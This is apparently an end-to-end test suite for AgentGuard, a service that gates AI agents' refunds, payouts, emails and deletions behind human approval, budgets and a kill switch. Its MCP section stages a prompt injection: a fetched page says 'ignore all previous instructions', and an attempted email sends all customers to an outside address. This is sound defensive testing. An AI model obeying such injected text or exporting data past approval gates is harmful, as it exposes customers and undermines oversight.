// End-to-end tests against a running AgentGuard server.
//
//   npm run dev            (in one terminal)
//   npm run test:e2e       (in another)
//
// Every run signs up a fresh workspace, so it never touches the demo data.
// The suite covers the approval loopholes from the product document:
// changed parameters, retries, split actions and unauthorized approvers.
// Pass --slow to also wait out a one-minute approval timeout.

const BASE = (process.env.AGENTGUARD_URL ?? "http://localhost:3000").replace(/\/$/, "");
const SLOW = process.argv.includes("--slow");
const stamp = Date.now().toString(36);
let passed = 0;
const failures = [];

function check(name, condition, detail) {
  if (condition) {
    passed++;
    console.log(`  ok   ${name}`);
  } else {
    failures.push(name);
    console.log(`  FAIL ${name}${detail === undefined ? "" : `\n         got: ${typeof detail === "string" ? detail : JSON.stringify(detail)}`}`);
  }
}

async function call(method, path, { body, token, cookie, headers } = {}) {
  const res = await fetch(BASE + path, {
    method,
    headers: {
      ...(body === undefined ? {} : { "content-type": "application/json" }),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...(cookie ? { cookie } : {}),
      ...headers,
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const text = await res.text();
  let json = null;
  try {
    json = text ? JSON.parse(text) : null;
  } catch {
    // Not JSON (CSV export, event stream).
  }
  return { status: res.status, json, text, headers: res.headers };
}

const sessionCookie = (res) => (res.headers.get("set-cookie") ?? "").split(";")[0];

async function login(email, password) {
  const res = await call("POST", "/api/auth/login", { body: { email, password } });
  if (res.status !== 200) throw new Error(`login failed for ${email}: ${res.text}`);
  return sessionCookie(res);
}

async function main() {
  console.log(`AgentGuard end-to-end tests against ${BASE}\n`);

  // --- workspace, people, agents ------------------------------------------------
  console.log("Setup");
  const password = "correct-horse-battery";
  const signup = await call("POST", "/api/auth/signup", { body: { organization: `E2E ${stamp}`, name: "Olivia Owner", email: `owner-${stamp}@e2e.test`, password } });
  check("sign up creates a workspace", signup.status === 201, signup.text);
  const owner = sessionCookie(signup);

  for (const [name, role] of [["Maya Manager", "approver"], ["Arjun Approver", "approver"], ["Vik Viewer", "viewer"]]) {
    const r = await call("POST", "/api/members", { cookie: owner, body: { name, email: `${role}-${name.split(" ")[0].toLowerCase()}-${stamp}@e2e.test`, role, password } });
    check(`add member ${name} (${role})`, r.status === 201, r.text);
  }
  const manager = await login(`approver-maya-${stamp}@e2e.test`, password);
  const approver2 = await login(`approver-arjun-${stamp}@e2e.test`, password);
  const viewer = await login(`viewer-vik-${stamp}@e2e.test`, password);
  check("wrong password is refused", (await call("POST", "/api/auth/login", { body: { email: `owner-${stamp}@e2e.test`, password: "nope-nope" } })).status === 401);

  const newAgent = async (name, extra = {}) => {
    const a = await call("POST", "/v1/agents", { cookie: owner, body: { name, platform: "Custom code", mode: "enforce", ...extra } });
    if (a.status !== 201) throw new Error(`could not create agent ${name}: ${a.text}`);
    const t = await call("POST", `/v1/agents/${a.json.agent.id}/tokens`, { cookie: owner, body: { name: "e2e", ...(extra.scopes ? { scopes: extra.scopes } : {}) } });
    return { id: a.json.agent.id, token: t.json.token };
  };
  const decide = (cookie, approvalId, decision, note = "") => call("POST", `/api/approvals/${approvalId}/decide`, { cookie, body: { decision, note } });

  check("management API needs authentication", (await call("GET", "/v1/agents")).status === 401);
  check("agent API needs a token", (await call("POST", "/v1/check", { body: { action: "data.read" } })).status === 401);
  check("viewer cannot create agents", (await call("POST", "/v1/agents", { cookie: viewer, body: { name: "x" } })).status === 403);

  for (const connector of ["stripe", "slack", "hubspot"]) {
    await call("POST", "/api/vault/credentials", { cookie: owner, body: { connector, mode: "sandbox" } });
  }
  const tpl = await call("POST", "/v1/rules", { cookie: owner, body: { template: "ecommerce-support" } });
  check("install the e-commerce template", tpl.status === 201 && tpl.json.rules.length === 4, tpl.text);

  // Charges to refund, created through the vault by an agent in observe mode.
  const setup = await newAgent("Setup bot", { mode: "observe" });
  const charges = {};
  for (const [key, customer, amount] of [["small", "cus_a", 90], ["big", "cus_b", 450], ["s1", "cus_split", 60], ["s2", "cus_split", 60], ["s3", "cus_split", 60], ["s4", "cus_split", 60], ["obs", "cus_obs", 500], ["kill", "cus_k", 80]]) {
    const r = await call("POST", "/v1/actions/stripe/charge", { token: setup.token, body: { params: { customer, amount, description: `e2e ${key}` } } });
    if (r.json?.status !== "executed") throw new Error(`could not create sandbox charge: ${r.text}`);
    charges[key] = r.json.result.id;
  }
  check("observe mode lets a high-risk action through but records what would have happened", true);

  const support = await newAgent("Support agent", { handles_private_data: true });
  const refund = (charge, amount, extra = {}) => call("POST", "/v1/actions/stripe/refund", { token: support.token, body: { params: { charge, amount }, explanation: "Customer asked.", ...extra } });

  // --- the $450 refund ------------------------------------------------------------
  console.log("\nVault: refunds");
  const small = await refund(charges.small, 40);
  check("a $40 refund is allowed and executed", small.json?.decision === "allow" && small.json.status === "executed" && small.json.result?.object === "refund", small.json);
  check("the vault corrects the customer from Stripe, not from the agent", small.json?.params?.customer === "cus_a", small.json?.params);

  const retry = await refund(charges.small, 40);
  check("a retry does not refund twice", retry.json?.duplicate === true && retry.json.already_executed === true && retry.json.event_id === small.json.event_id && retry.json.result?.id === small.json.result?.id, retry.json);
  const second = await refund(charges.small, 20);
  check("a second, different refund on the same charge is also treated as a duplicate", second.json?.duplicate === true && second.json.already_executed === true, second.json);
  const deliberate = await refund(charges.small, 20, { confirm_repeat: true });
  check("a deliberate repeat needs a person", deliberate.json?.decision === "pending" && deliberate.json.rules.includes("Deliberate repeat"), deliberate.json);

  const big = await refund(charges.big, 450);
  check("a $450 refund waits for a person", big.json?.decision === "pending" && !!big.json.approval_id && big.json.status === "pending", big.json);
  check("it names the rule that stopped it", big.json?.rules?.includes("Large refunds need a manager") && big.json.rules.includes("Refunds per customer per week"), big.json?.rules);
  const again = await refund(charges.big, 450);
  check("asking again does not create a second approval", again.json?.approval_id === big.json.approval_id && again.json.duplicate === true, again.json);

  const poll = await call("GET", `/v1/approvals/${big.json.approval_id}`, { token: support.token });
  check("the agent can poll its approval", poll.json?.status === "pending" && poll.json.params?.amount === 450, poll.json);
  check("another agent cannot read it", (await call("GET", `/v1/approvals/${big.json.approval_id}`, { token: setup.token })).status === 404);

  check("a viewer cannot approve", (await decide(viewer, big.json.approval_id, "approve")).status === 403);
  check("an agent token cannot approve", (await call("POST", `/api/approvals/${big.json.approval_id}/decide`, { token: support.token, body: { decision: "approve" } })).status === 401);
  check("nobody signed in cannot approve", (await decide("", big.json.approval_id, "approve")).status === 401);

  const approved = await decide(manager, big.json.approval_id, "approve", "Checked the order.");
  check("an approver approves and the vault executes the refund", approved.json?.status === "approved" && approved.json.event_status === "executed" && approved.json.result?.amount === 450, approved.json);
  check("approving twice is refused", (await decide(approver2, big.json.approval_id, "approve")).status === 409);
  const after = await refund(charges.big, 450);
  check("after approval a retry returns the same refund, not a new one", after.json?.already_executed === true && after.json.result?.id === approved.json.result?.id, after.json);

  // --- split refunds ----------------------------------------------------------------
  console.log("\nLoophole: splitting one refund into many small ones");
  const splits = [];
  for (const key of ["s1", "s2", "s3", "s4"]) splits.push((await refund(charges[key], 49)).json);
  check("three $49 refunds to one customer pass", splits.slice(0, 3).every((s) => s?.decision === "allow"), splits.map((s) => s?.decision));
  check("the fourth trips the weekly customer limit", splits[3]?.decision === "pending" && splits[3].rules.includes("Refunds per customer per week"), splits[3]);

  // --- changed parameters -------------------------------------------------------------
  console.log("\nLoophole: approve one thing, execute another (cooperative check API)");
  const checkApi = (body, token = support.token) => call("POST", "/v1/check", { token, body: { source: "sdk", ...body } });
  const ask = { action: "payment.refund", resource: `order:${stamp}`, params: { amount: 150, currency: "usd", customer: "cus_c" } };
  const c1 = await checkApi(ask);
  check("a $150 refund request waits for a person", c1.json?.decision === "pending", c1.json);
  await decide(manager, c1.json.approval_id, "approve");
  const tampered = await checkApi({ ...ask, params: { ...ask.params, amount: 900 } });
  check("changing the amount after approval needs a new approval", tampered.json?.decision === "pending" && tampered.json.approval_id !== c1.json.approval_id, tampered.json);
  const c2 = await checkApi(ask);
  check("the original request is allowed once, with the approved parameters", c2.json?.decision === "allow" && c2.json.event_id === c1.json.event_id && c2.json.params.amount === 150, c2.json);
  const mismatch = await call("POST", "/v1/events", { token: support.token, body: { event_id: c1.json.event_id, status: "completed", params: { ...ask.params, amount: 5000 } } });
  check("reporting different executed parameters raises a mismatch", mismatch.json?.parameter_mismatch === true, mismatch.json);
  const c3 = await checkApi(ask);
  check("once completed, the same request is a duplicate", c3.json?.duplicate === true && c3.json.already_executed === true, c3.json);
  const rejected = await checkApi({ action: "payment.refund", resource: `order:r-${stamp}`, params: { amount: 300, currency: "usd", customer: "cus_d" } });
  await decide(manager, rejected.json.approval_id, "reject", "Not eligible.");
  const nag = await checkApi({ action: "payment.refund", resource: `order:r-${stamp}`, params: { amount: 300, currency: "usd", customer: "cus_d" } });
  check("asking again after a rejection is blocked, not re-asked", nag.json?.decision === "block" && nag.json.rules.includes("Already rejected"), nag.json);

  // --- tools ----------------------------------------------------------------------------
  console.log("\nTools and permissions");
  const unknown = await checkApi({ tool: `wire_transfer_${stamp}`, params: { iban: "NP00", amount: 10 } });
  check("an unknown tool asks a human", unknown.json?.decision === "pending" && unknown.json.rules.includes("Unknown tool"), unknown.json);
  const del = await checkApi({ action: "data.delete", resource: "table:customers", params: {} });
  check("deleting data in production is blocked", del.json?.decision === "block" && del.json.rules.includes("Never delete data in production"), del.json);
  const read = await checkApi({ action: "order.read", params: { order_id: "1" } });
  check("a low-risk read is allowed", read.json?.decision === "allow", read.json);
  const read2 = await checkApi({ action: "order.read", params: { order_id: "1" } });
  check("reads may repeat freely", read2.json?.decision === "allow" && read2.json.duplicate === false && read2.json.event_id !== read.json.event_id, read2.json);

  const scoped = await newAgent("Scoped agent", { scopes: ["order.*"] });
  const outOfScope = await checkApi({ action: "payment.refund", resource: "order:x", params: { amount: 5 } }, scoped.token);
  check("a token cannot act outside its scope", outOfScope.json?.decision === "block" && outOfScope.json.rules.includes("Token scope"), outOfScope.json);

  // --- observe mode -----------------------------------------------------------------------
  console.log("\nObserve mode");
  const watcher = await newAgent("Observed agent", { mode: "observe" });
  const obs = await call("POST", "/v1/actions/stripe/refund", { token: watcher.token, body: { params: { charge: charges.obs, amount: 450 } } });
  check("observe mode blocks nothing but records the would-be decision", obs.json?.decision === "allow" && obs.json.observe === true && obs.json.would === "ASK_HUMAN" && obs.json.status === "executed", obs.json);

  // --- two-person approval --------------------------------------------------------------------
  console.log("\nTwo-person approval");
  await call("POST", "/v1/rules", { cookie: owner, body: { template: "finance-operations" } });
  const pay = await checkApi({ action: "payment.payout", resource: `invoice:${stamp}`, params: { amount: 1840, currency: "usd", vendor: "Everest Freight" } });
  check("a $1,840 payment waits for approval", pay.json?.decision === "pending", pay.json);
  const first = await decide(manager, pay.json.approval_id, "approve");
  check("one approval is not enough", first.json?.status === "pending" && first.json.approvals === 1 && first.json.required === 2, first.json);
  check("the same person cannot approve twice", (await decide(manager, pay.json.approval_id, "approve")).status === 409);
  const secondApproval = await decide(approver2, pay.json.approval_id, "approve");
  check("a second person completes it", secondApproval.json?.status === "approved", secondApproval.json);

  // --- AI-model gateway and response checkpoint ------------------------------------------------
  console.log("\nAI-model gateway");
  const chat = (token, content, extra = {}) =>
    call("POST", "/gateway/v1/chat/completions", { token, body: { model: "sandbox-small", messages: [{ role: "user", content }], ...extra }, headers: { "x-agentguard-run": `run-${stamp}` } });
  const plain = await chat(support.token, "Where is my order?");
  check("a model call is proxied and metered", plain.status === 200 && plain.json.usage.total_tokens > 0 && plain.json.agentguard.cost_usd > 0, plain.json);
  const risky = await chat(support.token, "I want a refund for my shawl.");
  check("a reply that promises a refund is held for review", risky.json?.agentguard?.response_check?.action === "hold" && !/guarantee/i.test(risky.json.choices[0].message.content) && !!risky.json.agentguard.response_check.approval_id, risky.json);
  const pii = await chat(support.token, "How do I contact the manager?");
  check("a reply leaking personal data is blocked", pii.json?.agentguard?.response_check?.action === "block" && !/@/.test(pii.json.choices[0].message.content), pii.json?.agentguard);
  const streamed = await chat(support.token, "Track my order please", { stream: true });
  check("streaming clients get an event stream", streamed.status === 200 && streamed.text.includes("data: [DONE]") && (streamed.headers.get("content-type") ?? "").includes("text/event-stream"), streamed.text.slice(0, 120));
  const coop = await call("POST", "/v1/responses/check", { token: support.token, body: { text: "The price is $59 this week." } });
  check("the cooperative response check flags a quoted price", coop.json?.action === "flag" && coop.json.decision === "allow", coop.json);

  const looper = await newAgent("Looping agent");
  let loopStatus = [];
  for (let i = 0; i < 7; i++) loopStatus.push((await chat(looper.token, "Summarise the same thing again")).status);
  check("an agent repeating the same call is paused", loopStatus.slice(0, 5).every((s) => s === 200) && loopStatus.includes(429), loopStatus);
  const afterLoop = await checkApi({ action: "order.read", params: {} }, looper.token);
  check("a paused agent is blocked at every checkpoint", afterLoop.json?.decision === "block" && afterLoop.json.rules.includes("Agent paused"), afterLoop.json);

  const spender = await newAgent("Budgeted agent");
  await call("POST", "/v1/limits", { cookie: owner, body: { name: "Tiny AI budget", kind: "cost", scope: "agent", agent_id: spender.id, period: "day", value: 0.000001 } });
  const firstCall = await chat(spender.token, "hello there");
  const overBudget = await chat(spender.token, "hello again friend");
  check("an AI budget stops the agent once it is used up", firstCall.status === 200 && overBudget.status === 429 && overBudget.json.error.code === "budget_exceeded", [firstCall.status, overBudget.json]);

  // --- MCP gateway -----------------------------------------------------------------------------
  console.log("\nMCP gateway");
  await call("POST", "/api/vault/credentials", { cookie: owner, body: { slug: "shop", name: "Shop tools", mcp_url: "builtin:demo-shop" } });
  await call("POST", "/api/vault/credentials", { cookie: owner, body: { slug: "shop-http", name: "Shop tools over HTTP", mcp_url: `${BASE}/demo/mcp` } });
  const mcpAgent = await newAgent("MCP agent", { handles_private_data: true });
  let rpcId = 0;
  const mcp = (server, method, params = {}, token = mcpAgent.token) =>
    call("POST", `/mcp/${server}`, { token, body: { jsonrpc: "2.0", id: ++rpcId, method, params }, headers: { "x-agentguard-run": `mcp-${stamp}` } });
  const text = (r) => r.json?.result?.content?.[0]?.text ?? "";

  const init = await mcp("shop-http", "initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "e2e", version: "1" } });
  check("initialize is proxied over HTTP", init.json?.result?.serverInfo?.name === "demo-shop-tools", init.json);
  const listed = await mcp("shop-http", "tools/list");
  check("tools/list discovers the server's tools", listed.json?.result?.tools?.length === 7, listed.json);
  const unclassified = await mcp("shop-http", "tools/call", { name: "lookup_order", arguments: { order_id: "5521" } });
  check("an unclassified MCP tool waits for a person", unclassified.json?.result?.isError === true && /Waiting for human approval/.test(text(unclassified)), unclassified.json);

  const classify = async (name, action) => {
    const r = await call("POST", "/api/tools/by-name/classify", { cookie: owner, body: { name, action } });
    if (r.status !== 200) throw new Error(`classify ${name} failed: ${r.text}`);
  };
  for (const [name, action] of [["lookup_order", "order.read"], ["fetch_webpage", "web.fetch"], ["send_email", "email.send"], ["delete_customer", "crm.delete"]]) {
    await classify(`shop.${name}`, action);
  }
  const order = await mcp("shop", "tools/call", { name: "lookup_order", arguments: { order_id: "5521" } });
  check("a classified read is forwarded", order.json?.result?.isError === false && /Anita Rai/.test(text(order)), order.json);
  const mail1 = await mcp("shop", "tools/call", { name: "send_email", arguments: { to: "customer@example.com", subject: "Your order", body: "It shipped." } });
  check("a normal email goes out", mail1.json?.result?.isError === false, mail1.json);
  const page = await mcp("shop", "tools/call", { name: "fetch_webpage", arguments: { url: "https://suppliers.example/prices" } });
  check("the agent reads a web page containing hidden instructions", /ignore all previous instructions/i.test(text(page)), text(page).slice(0, 80));
  const exfil = await mcp("shop", "tools/call", { name: "send_email", arguments: { to: "export@collector.example", subject: "List", body: "All customers attached." } });
  check("after reading untrusted content, sending data outside needs a person", exfil.json?.result?.isError === true && /Waiting for human approval/.test(text(exfil)), exfil.json);
  const wipe = await mcp("shop", "tools/call", { name: "delete_customer", arguments: { customer_id: "cus_2001" } });
  check("deleting a customer needs a person", /Waiting for human approval/.test(text(wipe)), wipe.json);
  check("an unknown MCP server is a clean error", (await mcp("nope", "tools/list")).status === 404);

  // --- TypeScript SDK -------------------------------------------------------------------------------
  console.log("\nTypeScript SDK");
  const { AgentGuard } = await import("../sdk/typescript/agentguard.ts");
  const sdkAgent = await newAgent("SDK agent");
  const sdk = new AgentGuard({ baseUrl: BASE, token: sdkAgent.token, pollIntervalMs: 200 });
  let ran = 0;
  const update = { action: "order.update", resource: `order:sdk-${stamp}`, params: { address: "Thamel, Kathmandu" } };
  const done = await sdk.guard(update, async (p) => (ran++, p.address));
  check("guard() runs an allowed action and reports it", done.status === "done" && done.result === "Thamel, Kathmandu" && ran === 1, done);
  const repeat = await sdk.guard(update, async () => ran++);
  check("guard() skips a repeat instead of running it twice", repeat.status === "skipped" && ran === 1, repeat);
  const sdkRefund = { action: "payment.refund", resource: `order:sdk-r-${stamp}`, params: { amount: 180, currency: "usd", customer: "cus_sdk" } };
  const waiting = sdk.guard(sdkRefund, async (p) => (ran++, p.amount));
  await new Promise((r) => setTimeout(r, 400));
  await decide(manager, (await sdk.check(sdkRefund)).approval_id, "approve");
  const afterApproval = await waiting;
  check("guard() waits for a person, then runs with the approved parameters", afterApproval.status === "done" && afterApproval.result === 180 && ran === 2, afterApproval);
  const refused = await sdk.guard({ action: "data.delete", resource: "table:orders", params: {} }, async () => ran++);
  check("guard() does not run a blocked action", refused.status === "blocked" && ran === 2, refused);
  const down = new AgentGuard({ baseUrl: "http://127.0.0.1:9", token: "x" });
  check("an unreachable AgentGuard raises a distinct error", await down.check(update).then(() => false, (e) => e.name === "AgentGuardUnreachable"));

  // Installed after the MCP tests: this pack also asks about email sent outside working hours.
  console.log("\nSales outreach template");
  await call("POST", "/v1/rules", { cookie: owner, body: { template: "sales-outreach" } });
  const blast = await checkApi({ action: "email.send", params: { subject: "Hello", recipient_count: 2400 } });
  check("an email to 2,400 recipients is blocked", blast.json?.decision === "block" && blast.json.rules.includes("No mass blasts") && blast.json.status === "blocked", blast.json);

  // --- kill switch -------------------------------------------------------------------------------
  console.log("\nKill switch");
  const pendingBeforeKill = await checkApi({ action: "payment.refund", resource: `order:k-${stamp}`, params: { amount: 900, currency: "usd", customer: "cus_k" } });
  const killed = await call("POST", `/v1/agents/${support.id}/kill`, { cookie: owner, body: { reason: "e2e test" } });
  check("the kill switch stops the agent", killed.json?.agent?.status === "killed", killed.json);
  check("its token no longer works anywhere", (await refund(charges.kill, 10)).status === 401 && (await chat(support.token, "hi")).status === 401);
  const orphan = await decide(manager, pendingBeforeKill.json.approval_id, "approve");
  check("its pending approvals were rejected and cannot be approved", orphan.status === 409, orphan.json);
  await call("POST", `/v1/agents/${support.id}/resume`, { cookie: owner, body: {} });
  check("after reactivation the old token stays revoked", (await refund(charges.kill, 10)).status === 401);

  // --- audit ---------------------------------------------------------------------------------------
  console.log("\nAudit trail");
  const verify = await call("GET", "/api/audit/verify", { cookie: owner });
  check("the audit hash chain verifies", verify.json?.ok === true && verify.json.entries > 50, verify.json);
  const csv = await call("GET", "/api/audit/export", { cookie: owner });
  check("the audit trail exports as CSV", csv.status === 200 && csv.text.startsWith("seq,time_utc") && csv.text.includes("approval.approved"), csv.text.slice(0, 80));
  check("a viewer cannot export it", (await call("GET", "/api/audit/export", { cookie: viewer })).status === 403);

  // --- timeouts ------------------------------------------------------------------------------------
  if (SLOW) {
    console.log("\nApproval timeout (waits about a minute)");
    await call("POST", "/api/settings", { cookie: owner, body: { approvalTimeoutMinutes: 1 } });
    const slow = await checkApi({ action: "payment.refund", resource: `order:t-${stamp}`, params: { amount: 700, currency: "usd", customer: "cus_t" } }, mcpAgent.token);
    await new Promise((r) => setTimeout(r, 62_000));
    const expired = await call("GET", `/v1/approvals/${slow.json.approval_id}`, { token: mcpAgent.token });
    check("an unanswered request is safely rejected after the timeout", expired.json?.status === "expired" && expired.json.event_status === "expired", expired.json);
    check("an expired request cannot be approved", (await decide(manager, slow.json.approval_id, "approve")).status === 409);
  }

  console.log(`\n${passed} passed, ${failures.length} failed`);
  if (failures.length) {
    console.log(failures.map((f) => `  - ${f}`).join("\n"));
    process.exit(1);
  }
}

main().catch((err) => {
  console.error("\nTest run aborted:", err);
  process.exit(1);
});
